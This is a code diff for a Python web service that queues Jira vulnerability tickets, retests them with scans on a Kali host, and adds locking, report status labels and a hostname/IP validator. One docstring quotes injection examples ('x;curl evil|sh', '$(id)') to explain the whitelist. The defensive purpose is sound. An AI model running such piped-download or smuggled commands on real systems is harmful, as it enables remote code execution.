@@ -1,5 +1,6 @@
 import asyncio
 import calendar
+import ipaddress
 import json
 import logging
 import os
@@ -71,8 +72,23 @@ CONFIG_PATH = "config/config.yaml"
 
 if os.path.exists(CONFIG_PATH):
     cfg = load_config(CONFIG_PATH)
+    # Constructing the clients no longer performs any network I/O, so import (and
+    # therefore uvicorn startup) is instant even if Jira is slow/unreachable.
     jira = JiraClient(cfg.jira)
     jira_secondary = JiraClientV2(cfg.jira_secondary) if cfg.jira_secondary else None
+
+    def _warm_jira_field_maps():
+        """Load the Jira field maps in the background so the first poll uses the
+        minimal (fast) field list without blocking app startup."""
+        for client in (jira, jira_secondary):
+            if client is None:
+                continue
+            try:
+                client._load_fields()
+            except Exception:
+                pass  # lazy _fid() will retry later; startup must never block
+
+    threading.Thread(target=_warm_jira_field_maps, daemon=True).start()
 else:
     cfg = None
     jira = None
@@ -357,8 +373,10 @@ def stop_triage_jobs(client_label: Optional[str] = None):
 def _triage_fixed_candidates(client_label: Optional[str] = None) -> List[dict]:
     """Queued jobs flagged 'likely fixed' by triage (port closed) — no full
     scan run on these. Used for the fast triage→transition shortcut."""
+    with scanner._lock:
+        jobs = list(scanner.JOBS.values())
     return [
-        job for job in scanner.JOBS.values()
+        job for job in jobs
         if job["status"] == "queued"
         and job.get("triage") == "closed"
         and (not client_label or job["client_label"] == client_label)
@@ -383,10 +401,16 @@ def triage_transition_preview(client_label: Optional[str] = None):
 
 @app.get("/api/jobs/{job_id}")
 def get_job(job_id: str):
-    job = scanner.JOBS.get(job_id)
-    if not job:
-        raise HTTPException(404, "Job not found")
-    return job
+    # Return a snapshot taken under the lock. The scan worker mutates the live
+    # job dict (appending to output_lines etc.) from another thread; serializing
+    # the live object could raise "changed size during iteration" mid-response.
+    with scanner._lock:
+        job = scanner.JOBS.get(job_id)
+        if not job:
+            raise HTTPException(404, "Job not found")
+        snapshot = dict(job)
+        snapshot["output_lines"] = list(job.get("output_lines") or [])
+    return snapshot
 
 
 @app.post("/api/jobs/{job_id}/scan")
@@ -460,11 +484,13 @@ def start_triage(job_id: str):
 @app.delete("/api/jobs/{job_id}")
 def remove_job(job_id: str):
     """Remove a job from the queue and allow its ticket to be re-queued on next poll."""
-    job = scanner.JOBS.get(job_id)
-    if not job:
-        raise HTTPException(404, "Job not found")
+    # Do the check-and-delete atomically under the lock; a concurrent poll cleanup
+    # or transition could otherwise remove the job between the check and the del,
+    # raising KeyError → 500.
     with scanner._lock:
-        del scanner.JOBS[job_id]
+        job = scanner.JOBS.pop(job_id, None)
+        if not job:
+            raise HTTPException(404, "Job not found")
         scanner.SEEN_KEYS.discard(job["ticket_key"])
     scanner._app_log(f"Removed: {job['ticket_key']} removed from queue")
     return {"ok": True}
@@ -557,10 +583,12 @@ def add_tickets(req: AddTicketsRequest):
         key = raw.strip().upper()
         if not key:
             continue
-        if key in scanner.SEEN_KEYS:
+        with scanner._lock:
+            already_queued = key in scanner.SEEN_KEYS
             existing = next(
                 (j for j in scanner.JOBS.values() if j["ticket_key"] == key), None
-            )
+            ) if already_queued else None
+        if already_queued:
             results.append({
                 "key": key, "status": "already_queued",
                 "summary": existing["ticket_summary"] if existing else "",
@@ -568,7 +596,14 @@ def add_tickets(req: AddTicketsRequest):
             continue
         try:
             ticket = jira_client.get_ticket(key)
-            scanner.SEEN_KEYS.add(key)
+            # Re-check under the lock after the (slow) network fetch: the poller
+            # could have queued this same key while we were fetching. Claim the
+            # key atomically so we never create a duplicate job.
+            with scanner._lock:
+                if key in scanner.SEEN_KEYS:
+                    results.append({"key": key, "status": "already_queued", "summary": ticket.get("summary", "")})
+                    continue
+                scanner.SEEN_KEYS.add(key)
             job_id = scanner._queue_ticket(ticket, req.client_label, source="manual", session=client_session)
             rule = scanner.JOBS[job_id].get("rule_name")
             scanner._app_log(
@@ -607,9 +642,11 @@ def transition_ticket(req: TransitionRequest):
     ticket_key = job["ticket_key"]
     jira_client = _jira_for_job(job)
     try:
+        # Transition first, then comment — so we never leave a "verified fixed"
+        # comment on a ticket whose transition actually failed.
+        jira_client.transition(ticket_key, req.to_status)
         if req.comment:
             jira_client.add_comment(ticket_key, req.comment)
-        jira_client.transition(ticket_key, req.to_status)
         # Remove job immediately — don't wait for poll to clean it up.
         # Jira's search index lags after a transition, so the poll would
         # still see the ticket as Remediated and leave it in the queue.
@@ -896,16 +933,20 @@ def _bulk_transition_candidates():
       verdict=not_fixed + ticket was Open       → skip (already correct state)
       verdict=inconclusive / error              → skip
     """
-    retest = cfg.jira.retest_status
     to_fixed, to_not_fixed = [], []
-    for job in scanner.JOBS.values():
+    with scanner._lock:
+        jobs = list(scanner.JOBS.values())
+    for job in jobs:
         if job["status"] != "completed" or job.get("jira_updated"):
             continue
         verdict = job.get("verdict")
-        ticket_status = job.get("ticket_status", "")
+        # Resolve the retest status per the job's own session (Axian vs
+        # Non-Axian may name it differently), and compare case-insensitively.
+        retest = _jira_for_job(job).cfg.retest_status or ""
+        ticket_status = job.get("ticket_status", "") or ""
         if verdict == "fixed":
             to_fixed.append(job)
-        elif verdict == "not_fixed" and ticket_status == retest:
+        elif verdict == "not_fixed" and ticket_status.strip().lower() == retest.strip().lower():
             to_not_fixed.append(job)
     return to_fixed, to_not_fixed
 
@@ -925,10 +966,15 @@ def triage_transition_bulk(req: TriageTransitionRequest):
 
     def _do(job):
         key = job["ticket_key"]
+        # Use the session-correct client (Axian vs Non-Axian). Previously this
+        # hardcoded the global Axian `jira`, so Non-Axian tickets hit the wrong
+        # Jira instance (wrong base URL/auth → error or wrong-ticket action).
+        jira_client = _jira_for_job(job)
         try:
+            # Transition first, comment only after it succeeds.
+            jira_client.transition(key, "Fixed")
             if req.comment:
-                jira.add_comment(key, req.comment)
-            jira.transition(key, "Fixed")
+                jira_client.add_comment(key, req.comment)
             with scanner._lock:
                 scanner.JOBS.pop(job["id"], None)
                 scanner.SEEN_KEYS.discard(key)
@@ -992,12 +1038,34 @@ def transition_bulk():
 _report_cache: dict = {}   # (client, month) → result; past months never change
 
 
+# Jira statuses that mean the vulnerability is resolved/fixed.
+_REPORT_FIXED_STATUSES = {"fixed", "closed", "done", "resolved"}
+# Risk Accepted is its own outcome — it is NOT "Not Fixed" (the risk was
+# formally accepted, not left open), so it gets its own label.
+_REPORT_RISK_ACCEPTED_STATUSES = {"risk accepted", "accepted risk"}
+
+
 def _to_report_item(issue: dict) -> dict:
+    raw_status = (issue.get("status") or "").strip()
+    low = raw_status.lower()
+    is_fixed = low in _REPORT_FIXED_STATUSES
+    is_risk_accepted = low in _REPORT_RISK_ACCEPTED_STATUSES
+    if is_fixed:
+        status_label = "Fixed"
+    elif is_risk_accepted:
+        status_label = "Risk Accepted"
+    else:
+        status_label = "Not Fixed"
     return {
         "key": issue["key"],
         "vuln_name": issue.get("summary", ""),
         "ip": (issue.get("ips") or [""])[0],
         "rating": issue.get("rating") or issue.get("severity") or "",
+        # Raw Jira status plus a Fixed / Not Fixed / Risk Accepted label.
+        "status": raw_status or "—",
+        "status_label": status_label,
+        "is_fixed": is_fixed,
+        "is_risk_accepted": is_risk_accepted,
     }
 
 
@@ -1600,12 +1668,38 @@ def batch_scan_rules():
     return [{"name": r.name, "tool": r.tool} for r in RULES]
 
 
+def _is_safe_scan_target(ip: str) -> bool:
+    """True only for a plain IPv4/IPv6 address or DNS hostname.
+
+    Batch-scan targets come from a user-uploaded XLSX/CSV and are interpolated
+    into shell commands executed on the Kali box, so a cell like
+    ``x;curl evil|sh`` or ``$(id)`` would be command injection. We whitelist a
+    strict character set instead of trying to blacklist metacharacters.
+    """
+    if not ip or len(ip) > 253:
+        return False
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        pass
+    # Hostname: labels of [A-Za-z0-9-], separated by dots, no leading/trailing hyphen.
+    return bool(re.match(
+        r'^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)'
+        r'(?:\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*$', ip))
+
+
 def _batch_scan_one(kali, ip: str, port: int, rule) -> dict:
     """Run a scan for one IP:port using the given VulnRule and return a result row."""
     import re as _re
     from .vuln_rules import _xml_elem
 
-    job_id   = f"batch_{ip}_{port}_{os.getpid()}"
+    if not _is_safe_scan_target(ip):
+        raise ValueError(f"Refusing to scan unsafe/invalid target: {ip!r}")
+
+    # uuid keeps concurrent scans of the same ip:port from colliding on /tmp and
+    # avoids a predictable, symlink-attackable path on the shared Kali host.
+    job_id   = f"batch_{uuid.uuid4().hex}"
     xml_path = f"/tmp/batchscan_{job_id}.xml"
 
     if rule.tool == "curl":
@@ -1682,7 +1776,12 @@ async def batch_scan_run(
     data = await file.read()
     fname = file.filename or ""
     try:
-        assets = _parse_assets(data, fname)
+        # openpyxl/CSV parsing is CPU-bound and can be slow on large files;
+        # run it in a worker thread so it doesn't block the event loop (which
+        # would stall every other request, SSE stream, and WebSocket).
+        assets = await asyncio.get_running_loop().run_in_executor(
+            None, _parse_assets, data, fname
+        )
     except Exception as exc:
         raise HTTPException(400, f"Could not read file: {exc}")
 
@@ -1992,6 +2091,23 @@ def clear_manual_jobs():
             del scanner.JOBS[jid]
             removed += 1
     scanner._app_log(f"Cleared {removed} manual job(s) from queue")
+    return {"ok": True, "removed": removed}
+
+
+@app.delete("/api/poll/jobs")
+def clear_poll_jobs():
+    """Remove all non-scanning remediated (Jira poll) jobs from the queue."""
+    with scanner._lock:
+        to_remove = [
+            jid for jid, j in scanner.JOBS.items()
+            if j.get("source", "poll") == "poll" and j["status"] != "scanning"
+        ]
+        removed = 0
+        for jid in to_remove:
+            scanner.SEEN_KEYS.discard(scanner.JOBS[jid]["ticket_key"])
+            del scanner.JOBS[jid]
+            removed += 1
+    scanner._app_log(f"Cleared {removed} remediated job(s) from queue")
     return {"ok": True, "removed": removed}
 
 
